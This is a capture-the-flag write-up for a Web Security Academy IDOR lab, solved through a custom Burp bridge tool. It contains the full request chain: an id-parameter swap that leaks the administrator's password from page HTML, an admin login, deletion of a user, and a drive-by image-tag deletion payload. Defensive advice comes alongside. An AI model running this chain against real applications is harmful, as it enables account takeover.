---
tags:
  - CTF
  - WebSecurityAcademy
  - writeup
  - access-control
  - idor
  - password-disclosure
  - account-takeover
  - burp-extension
  - cc-bridge
  - tooling-trial
difficulty: Apprentice
platform: Web Security Academy
date: 2026-06-02
status: Solved ✅
bridge_version: 0.1.0
flags:
  flag: notification-labsolved (administrator account taken over via IDOR + carlos deleted)
---

## Lab: User ID controlled by request parameter with password disclosure

**Class:** Broken access control / IDOR / sensitive data exposure
**Bridge endpoints used:** `/send`
**Bridge endpoints that failed:** none in v0.1 surface
**Total cc-burp calls:** 12 (1 recon + 1 login-get + 1 login-wiener + 1 acct-wiener + 2 acct-admin + 1 login-get-2 + 1 login-admin + 1 home-admin + 1 admin-panel + 1 delete-carlos + 1 home-final)
**Time to solve:** ~3 minutes wall time
**GUI fallback needed:** No
**Solve chain:** see numbered steps below
**Notable bridge behavior:** Lowest call count in the trial so far. The lab is one HTTP parameter swap — `?id=wiener` → `?id=administrator` — surfaced through a parameter that's read from query-string at render time rather than from session state. Every step was a single `/send`; no need for `/repeat`, `/decode`, `/scan`, or `/collaborator`. v0.1's minimal surface (`/send` with explicit cookie threading) is enough.

---

# User ID controlled by request parameter with password disclosure — Web Security Academy

## Summary

`/my-account` reads the displayed user's identity from the **`id` query-string parameter**, not from the authenticated session. The page also renders that user's current password into a hidden form input (`<input type=password name=password value='...'>`) so the user can submit the change-email form without re-entering credentials. Combined: any authenticated user can request `/my-account?id=administrator` and the administrator's plaintext password is rendered into the response HTML. Logging in as the admin with the recovered password and clicking the `Delete carlos` action in the admin panel trips the lab-solved marker.

All requests through **CC-Bridge v0.1** via `cc-burp send`. Twelve calls total, three minutes wall time.

---

## Flags

| Marker | Value |
|---|---|
| Lab-solved element | `<section id=notification-labsolved>` + `widgetcontainer-lab-status is-solved` |
| Admin credentials | `administrator` : `1puzuy3bfnhki60bivvw` |
| Exploit primitive | `GET /my-account?id=administrator` (authenticated as wiener) |
| Disclosure location | `<input required type=password name=password value='1puzuy3bfnhki60bivvw'>` in response body |

---

## Enumeration

```bash
LAB=https://0a8300e703258e038044e1eb000b003c.web-security-academy.net
CC=~/burp-ext/cc-bridge/cc-burp

# 1. Identify the lab
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/\"}"
# <title>User ID controlled by request parameter with password disclosure</title>
# Set-Cookie: session=bMFKxI5de0WKIbQPCtQWhKa5JsSpKm9C
```

The title literally tells you the bug class and the disclosure mechanism, which is the academy's pedagogy talking — but it also tells you exactly two things to probe:

1. Find a URL where the user ID is in a request parameter
2. Inspect the response for password-shaped data

Both surface on `/my-account` once authenticated.

---

## Step 1 — Login as wiener

```bash
# Login page -> CSRF + initial session
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/login\"}"
# session=WQeG7r46Yvd9ukpFU52D2QwnHsA0MiZO
# csrf=wIcjGKVbe6lahgGPoTAdnexFThnGVwjh

# Submit credentials
$CC send -d "{
  \"method\":\"POST\",\"url\":\"$LAB/login\",
  \"headers\":{
    \"Content-Type\":\"application/x-www-form-urlencoded\",
    \"Cookie\":\"session=WQeG7r46Yvd9ukpFU52D2QwnHsA0MiZO\"
  },
  \"body\":\"csrf=wIcjGKVbe6lahgGPoTAdnexFThnGVwjh&username=wiener&password=peter\"
}"
# 302 -> /my-account?id=wiener
# Set-Cookie: session=H8Jbf7KD5lJUqlHlcJ6WNfY58fg7uNOV
```

The redirect target — `/my-account?**id=wiener**` — is the smoking gun. The server is putting the username on the URL right after authentication, which strongly suggests the rendering code reads it back from the URL instead of from the session.

> [!tip]
> **Read the redirect.** Every time a successful login redirects to a `?something=username` URL, treat that parameter as IDOR-suspect and try swapping it before touching anything else. The cost is one request; the win-condition is account takeover.

---

## Step 2 — Confirm the rendering source

Visit `/my-account?id=wiener` as the authenticated wiener:

```bash
$CC send -d "{
  \"method\":\"GET\",\"url\":\"$LAB/my-account?id=wiener\",
  \"headers\":{\"Cookie\":\"session=H8Jbf7KD5lJUqlHlcJ6WNfY58fg7uNOV\"}
}"
# 200, renders "Your username is: wiener" plus a change-email form
```

The page renders normally. The interesting question is what changes when `?id=` changes — specifically, does the server check that the URL's id matches the session-authenticated user?

---

## Step 3 — The IDOR

```bash
$CC send -d "{
  \"method\":\"GET\",\"url\":\"$LAB/my-account?id=administrator\",
  \"headers\":{\"Cookie\":\"session=H8Jbf7KD5lJUqlHlcJ6WNfY58fg7uNOV\"}
}"
# 200, length 3939
# body contains: <input required type=password name=password value='1puzuy3bfnhki60bivvw'>
```

Two distinct bugs combined in one response:

1. **Missing authorization check.** The server happily renders administrator's account page to an authenticated non-administrator. The session belongs to wiener; the URL says administrator; the server uses the URL.
2. **Password rendered into HTML.** The page emits the current password as the `value=` of a hidden-ish form input so the change-email form can submit it. Anyone who can request the page reads the password by inspecting the HTML.

Either bug alone is bad. Together they're full account takeover by anyone who can log in to *any* account on the system.

Full password extracted with one regex:

```python
m = re.search(r"name=password\s+value=['\"]([^'\"]+)['\"]", body)
# ADMIN_PASSWORD = 1puzuy3bfnhki60bivvw
```

> [!important]
> **Never render passwords into HTML, full stop.** The "convenience" the form was after — submitting a change-email request without re-prompting for the password — could have been solved by re-authenticating with a short-lived token, by relying on the session cookie, or by simply omitting the password field from the submission (servers can look up the current value). Putting the literal password into a `value=` attribute trades convenience for a class of bug that's trivially mass-exploitable.

---

## Step 4 — Re-login as administrator

A new session is needed because the wiener login redirected to `/my-account?id=wiener` and the cookie I have is wiener's. (PortSwigger labs sometimes allow `?id=administrator` to also confer admin privileges, but cleaner to re-authenticate so all subsequent calls are auditable as admin actions.)

```bash
# Fresh login page
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/login\"}"
# session=J0bygmLgYfWEf1ZzeBZ3jSuXMTbIdIrf
# csrf=w0LTr43VaCEtIW5Bp2HNWlRMi0MFL84I

# Login as administrator
$CC send -d "{
  \"method\":\"POST\",\"url\":\"$LAB/login\",
  \"headers\":{
    \"Content-Type\":\"application/x-www-form-urlencoded\",
    \"Cookie\":\"session=J0bygmLgYfWEf1ZzeBZ3jSuXMTbIdIrf\"
  },
  \"body\":\"csrf=w0LTr43VaCEtIW5Bp2HNWlRMi0MFL84I&username=administrator&password=1puzuy3bfnhki60bivvw\"
}"
# 302 -> /my-account?id=administrator
# Set-Cookie: session=HSlrHwYLrOfoNvT0DgKQSYYPgmDHZ8IV
```

---

## Step 5 — Delete carlos via the admin panel

```bash
SESS=HSlrHwYLrOfoNvT0DgKQSYYPgmDHZ8IV

# Discover admin link
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/\",\"headers\":{\"Cookie\":\"session=$SESS\"}}"
# <a href="/admin">Admin panel</a>

# Find the carlos delete URL
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/admin\",\"headers\":{\"Cookie\":\"session=$SESS\"}}"
# <a href="/admin/delete?username=carlos">Delete</a>

# Pull the trigger
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/admin/delete?username=carlos\",\"headers\":{\"Cookie\":\"session=$SESS\"}}"
# 302 -> /admin

# Verify lab-solved
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/\",\"headers\":{\"Cookie\":\"session=$SESS\"}}"
# notification-labsolved + widgetcontainer-lab-status is-solved
```

> [!note]
> **Admin actions exposed as `GET`-with-side-effects.** The delete action is a `GET /admin/delete?username=carlos` — no CSRF token, no `POST`, no confirmation step. That's a separate bug that's not the stated lab vuln but is worth flagging in any real report (`<img src="/admin/delete?username=ceo">` in an admin's email = drive-by user deletion).

---

## Attack Chain Summary

```
GET /                                       -> identify lab; receive session cookie
GET /login                                  -> CSRF + initial session
POST /login (wiener:peter + CSRF)           -> 302 /my-account?id=wiener           <-- redirect leaks intent
GET /my-account?id=wiener                   -> renders wiener's account
GET /my-account?id=administrator            -> 200, password='1puzuy3bfnhki60bivvw' <-- IDOR + disclosure
                                                                                        (extract via regex
                                                                                        on the response body)
GET /login                                  -> fresh CSRF + session
POST /login (administrator + leaked pwd)    -> 302 /my-account?id=administrator
GET /                                       -> discover /admin link
GET /admin                                  -> discover /admin/delete?username=carlos
GET /admin/delete?username=carlos           -> 302 /admin                          <-- carlos deleted
GET /                                       -> notification-labsolved              <-- solved
```

---

## Key Concepts

**Authentication is who; authorization is what.** This lab's bug isn't authentication — it correctly verifies that the session cookie belongs to *some* logged-in user. The bug is authorization: `/my-account?id=administrator` is rendered for whichever user the URL names, with no check that "the requester is allowed to see this user's account." Every IDOR is some flavor of "authentication passed; authorization wasn't checked." When auditing access control, mentally separate the two and ensure both are gated independently on every sensitive route.

**Sensitive data should never round-trip through the client.** Even if the authorization check had been correct, rendering the password into the response HTML is its own bug. Any XSS, any browser-extension keylogger, any cached HTML, any DOM-snapshot crash reporter, any `view-source:` in an open-laptop scenario discloses the credential. There's no scenario where the right design is "embed the user's current password in the form so we can echo it back on submit." Passwords belong in `WHERE` clauses, hashes belong in storage, neither belongs in HTML.

**Query-string parameters are user input, equal to URL paths and form bodies.** Developers consistently underestimate this. Rails-style controllers like `def show(@user = User.find(params[:id]))` are an entire bug class when the controller doesn't also check `current_user.can_view?(@user)`. The fix isn't framework-specific — it's the same authorization-on-every-read invariant — but the bug-class is everywhere the framework's ergonomics nudge devs toward "the URL says who to fetch."

**Twelve calls for a complete account-takeover audit is the lower bound.** This is roughly the irreducible call count to: identify, auth as a non-privileged user, probe the IDOR, extract, re-auth as privileged user, perform a side-effecting action, verify. Anything lower is missing a step. The bridge handled it as a slow conversational REPL — one `/send` per step, all the cognitive load on the regex/JSON parsing in shell pipelines. Exactly the right factoring.

---

## Detection / Defense

| Control | What it Prevents |
|---|---|
| Server-side check on every `/my-account` render: `if requested_user != current_user and not current_user.is_admin: 403` | The IDOR itself |
| Drop the `?id=` parameter entirely; derive the user from `request.session.user` | Removes the attack surface |
| Never render passwords into HTML responses; have the change-email form submit only `email` and look up the password server-side from the session | The disclosure half of the bug |
| Change-sensitive actions go through `POST` with CSRF tokens, never `GET` (e.g. `/admin/delete`) | Drive-by/CSRF account deletion |
| WAF/IDS rule that flags any response body containing `name=password\s+value=` for non-login endpoints | Catches the disclosure pattern even if introduced by a future regression |
| Audit log on every `/my-account` access where `requested_user != current_user` | Detection — most legitimate use never crosses identity |

---

## Dead Ends

| Approach | Why It Failed / Why I Skipped |
|---|---|
| `/decode` on the session cookie | Cookie is opaque random, not encoded |
| `/repeat` | Each step had a different shape; iteration wasn't the bottleneck |
| `/scan` | Burp Community returns 501 from CC-Bridge v0.1 — not run |
| `/collaborator` | Not applicable to an in-band disclosure bug |
| Forcing `?id=` to inject SQL | The id is interpolated into a `WHERE` but parameterized — no SQLi observed (and not needed) |
| Brute-forcing `?id=1, 2, 3...` numeric IDs | Lab uses string usernames as the identifier; numeric range would be a different lab |

---

## Bridge Behavior Notes (CC-Bridge v0.1)

| Endpoint | Calls This Lab | Behavior |
|---|---:|---|
| `POST /send` | 12 | All worked. Stable history IDs (222–234 range). |
| `POST /repeat/{id}` | 0 | Not needed. |
| `GET /history/{id}` | 0 | Not needed (responses parsed inline). |
| `GET /history` | 0 | – |
| `POST /decode` | 0 | – |
| `POST /scan` | 0 | – |
| `GET /issues` | 0 | – |
| `POST /collaborator/new` | 0 | – |
| `GET /collaborator/{ctx}` | 0 | – |

**Observation:** This is the smallest possible useful workflow against the bridge. If `/send` is broken, no lab solves; if `/send` works, the floor is reachable. Twelve calls is roughly the minimum cost for "find IDOR + escalate + verify" and the bridge handled it as a thin layer over `curl`.

**Pattern across labs so far.** Logic labs (32 calls), IDOR/access-control labs (12 calls), and API discovery (~12 calls) all sit in a tight range. The outlier is the oracle-driven blind SQLi (146 calls) where iteration count is the dominant cost. The bridge's call-count distribution is bimodal: linear-conversation labs versus iterative-extraction labs, with `/repeat` mattering only for the latter.

**No bugs surfaced — nothing to add to v0.2 spec from this lab.**

---

## Lessons Learned

1. **Login redirects are recon.** The 302 target after `POST /login` often discloses how the app names its principals (`?id=wiener` vs `?userId=42` vs no parameter at all). It's a free signal that the URL is part of the identity model — and therefore an IDOR candidate.
2. **Try the obvious thing first.** Before fuzzing IDs, brute-forcing UUIDs, or reading the source, swap `wiener` for `administrator` literally. It costs one request and either solves the lab or rules out the trivial case. In real engagements substitute the customer's tenant naming convention (`acme` for `globex`, `team-7` for `team-8`).
3. **Server-side rendering of credentials is a tell.** When `view-source` on any post-login page contains `name=password value=...`, the same pattern almost certainly exists on every account-management page in the application. Grep the whole site response by response.
4. **`/send` is the workhorse — `/repeat` is for iteration.** Three labs in a row solved primarily with `/send`. `/repeat` was decisive only on the oracle lab. If I were re-prioritizing the v0.2 work after this trial, I'd polish `/send`'s ergonomics (cookie-jar opt-in, response regex-extract) before adding more handler types.
5. **Twelve well-chosen requests beats four hundred mindless ones.** I could have run sqlmap, nikto, dirb, scanned the API, fuzzed every parameter — and learned nothing the lab title didn't say. Reading the redirect target after login and trying the obvious swap got the answer in two requests. Cycle time on hypothesis → test matters more than raw request volume.

---

## Tools

| Tool | Purpose |
|---|---|
| `cc-bridge` v0.1 (Burp extension) | HTTP control plane over Burp's Montoya API |
| `cc-burp` (bash wrapper) | `curl` driver, bearer auth, JSON in/out |
| Burp Suite Community 2025.x | Hosts the extension, logs every request in Proxy history |
| `python3` (inline) | HTML parsing — `<input ... value='...'>` regex extraction, Set-Cookie pulls |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `cc-bridge` (custom Burp extension, v0.1) | Localhost HTTP control plane over Burp's Montoya API |
| `cc-burp` (bash wrapper) | `curl` driver, bearer auth |
| Burp Suite Community 2025.x | Extension host, proxy, request logger |
| `python3` (inline) | HTML / JSON parsing in shell pipelines |

---

*Web Security Academy — User ID controlled by request parameter with password disclosure | Solved | CC-Bridge v0.1*
